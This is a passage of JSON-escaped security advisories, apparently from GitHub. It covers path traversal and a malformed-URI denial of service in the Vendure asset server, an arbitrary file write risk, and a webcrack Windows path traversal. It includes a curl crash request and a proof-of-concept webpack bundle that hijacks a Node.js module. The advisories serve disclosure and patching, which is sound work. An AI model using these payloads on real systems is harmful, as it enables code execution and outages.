However, depending the type of root server one can try various payloads to bypass such normalization. \n\nThe reporter found a customer website which uses local asset plugin and using above mentioned vulnerability, and was able to find secrets like email credentials.\n\n\n## DOS via malformed URI\n\nIn the same code path is an additional vector for crashing the server via a malformed URI\n\nAgain from Rajesh:\n\nThere is also a potential Denial of Service (DoS) issue when incorrectly encoded URI characters are passed as part of the asset URL. When these malformed requests are processed, they can lead to system crashes or resource exhaustion, rendering the service unavailable to users.\nExploit: `curl  --path-as-is http://localhost:3000/assets/%80package.json` , here `%80` is not a valid url-encoded character hence the decodeURIComponent is called on it, the entire app crashes. \n\n```\n[:server] /Users/abc/mywork/vendure/packages/asset-server-plugin/src/plugin.ts:353\n[:server]         const decodedReqPath = decodeURIComponent(req.path);\n[:server]                                ^\n[:server] URIError: URI malformed\n```\n\n### Patches\nv3.0.5, v2.3.3\n\n### Workarounds\n- Use object storage rather than the local file system, e.g. MinIO or S3\n- Define middleware which detects and blocks requests with urls containing `/../`\n\n",

Risk\n\nThe attacker can write arbitrary files to disk, including overwriting existing JavaScript to execute arbitrary code on the server, leading to a complete system compromise, server control, and further network penetration.\n\nAttackers can gain full access to the server.\n\n### Recommendation\n\n**Input Validation**\n\n- Ensure thorough validation of user inputs, particularly id parameter, file paths and file names, to prevent directory traversal and ensure they end up in the desired folder location post-normalization. [[OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)](https://owasp.org/www-community/attacks/Path_Traversal)\n\n**Arbitrary File Upload**\n\n- Restrict the types of files that can be uploaded via a allow-only list.\n\n### Credits\n- @ropwareJB\n- @noe233",

      "description": "### Summary\nAn arbitrary file write vulnerability exists in the webcrack module when processing specifically crafted malicious code on Windows systems. This vulnerability is triggered when using the unpack bundles feature in conjunction with the saving feature. If a module name includes a path traversal sequence with Windows path separators, an attacker can exploit this to overwrite files on the host system.\n\n### Details\n\nSource: [packages/webcrack/src/unpack/bundle.ts#L79](https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79)\n```ts\nimport { posix } from 'node:path';\nimport type { Module } from './module';\n\n// eslint-disable-next-line @typescript-eslint/unbound-method\nconst { dirname, join, normalize } = posix;\n\n/* ... snip ... */\n\nconst modulePath = normalize(join(path, module.path));\nif (!modulePath.startsWith(path)) {\n    throw new Error(`detected path traversal: ${module.path}`);\n}\nawait mkdir(dirname(modulePath), {\n    recursive: true\n});\nawait writeFile(modulePath, module.code, 'utf8');\n```\n\nIn this code, the application explicitly relies on the POSIX version of path utilities (`dirname`, `join`, `normalize`) from Node.js. However, the vulnerability arises because the POSIX version of the `normalize` function does not recognize `\\` as a path separator. As a result, on Windows systems, the path traversal check fails, allowing an attacker to write files to unintended locations.\n\n### PoC\nThe following proof of concept demonstrates how this vulnerability can be exploited to overwrite and hijack the `debug` module in Node.js:\n\n**Malicious Script (what.js):**\n\n```js\n(function (e) {\n    var n = {};\n    function o(r) {\n      if (n[r]) {\n        return n[r].exports;\n      }\n      var a = (n[r] = {\n        i: r,\n        l: false,\n        exports: {},\n      });\n      e[r].call(a.exports, a, a.exports, o);\n      a.l = true;\n      return a.exports;\n    }\n    o.p = '';\n    o((o.s = 386));\n  })({\n    './\\\\..\\\\node_modules\\\\debug\\\\src\\\\index': function (e, t, n) {\n        module.exports = () => console.log(\"pwned\")\n    },\n  });\n```\n\n**Webcrack Script (index.js):**\n\n```js\nimport fs from 'fs';\nimport { webcrack } from 'webcrack';\n\nconst input = fs.readFileSync('what.js', 'utf8');\n\nconst result = await webcrack(input);\nconsole.log(result.code);\nconsole.log(result.bundle);\nawait result.save('output-dir');\n```\n\n**Execution:**\nRunning the above script with `node index.js` twice results in the following output being printed to the terminal:\n\n```\nPS C:\\Webcrack> node .\\index.js\nDebugger attached.\n(function (e) {\n  var n = {};\n  function o(r) {\n    if (n[r]) {\n      return n[r].exports;\n    }\n    var a = n[r] = {\n      i: r,\n      l: false,\n      exports: {}\n    };\n    e[r].call(a.exports, a, a.exports, o);\n    a.l = true;\n    return a.exports;\n  }\n  o.p = \"\";\n  o(o.s = 386);\n})({\n  \"./\\\\..\\\\node_modules\\\\debug\\\\src\\\\index\": function (e, t, n) {\n    module.exports = () => console.log(\"pwned\");\n  }\n});\nWebpackBundle {\n  type: 'webpack',\n  entryId: '386',\n  modules: Map(1) {\n    './\\\\..\\\\node_modules\\\\debug\\\\src\\\\index' => WebpackModule {\n      id: './\\\\..\\\\node_modules\\\\debug\\\\src\\\\index',\n      isEntry: false,\n      path: '././\\\\..\\\\node_modules\\\\debug\\\\src\\\\index.js',\n      ast: [Object]\n    }\n  }\n}\nWaiting for the debugger to disconnect...\nPS C:\\Webcrack> node .\\index.js\nDebugger attached.\npwned\npwned\npwned\npwned\npwned\npwned\npwned\nWaiting for the debugger to disconnect...\nfile:///C:/Webcrack/node_modules/webcrack/dist/index.js:444\n  if (options.log) logger(`${name}: started`);\n                   ^\n\nTypeError: logger is not a function\n    at applyTransforms (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:444:20)\n    at Array.<anonymous> (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4259:7)\n    at webcrack (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4292:20)\n    at async file:///C:/Webcrack/index.js:6:16\n\nNode.js v18.16.0\n```\n\nThis demonstrates that the debug module was successfully overwritten and hijacked to print `pwned` to the console, confirming the arbitrary file write vulnerability has lead to code execution.\n\n### Impact\nThis vulnerability allows an attacker to write arbitrary `.js` files to the host system, which can be leveraged to hijack legitimate Node.js modules to gain arbitrary code execution.\n",
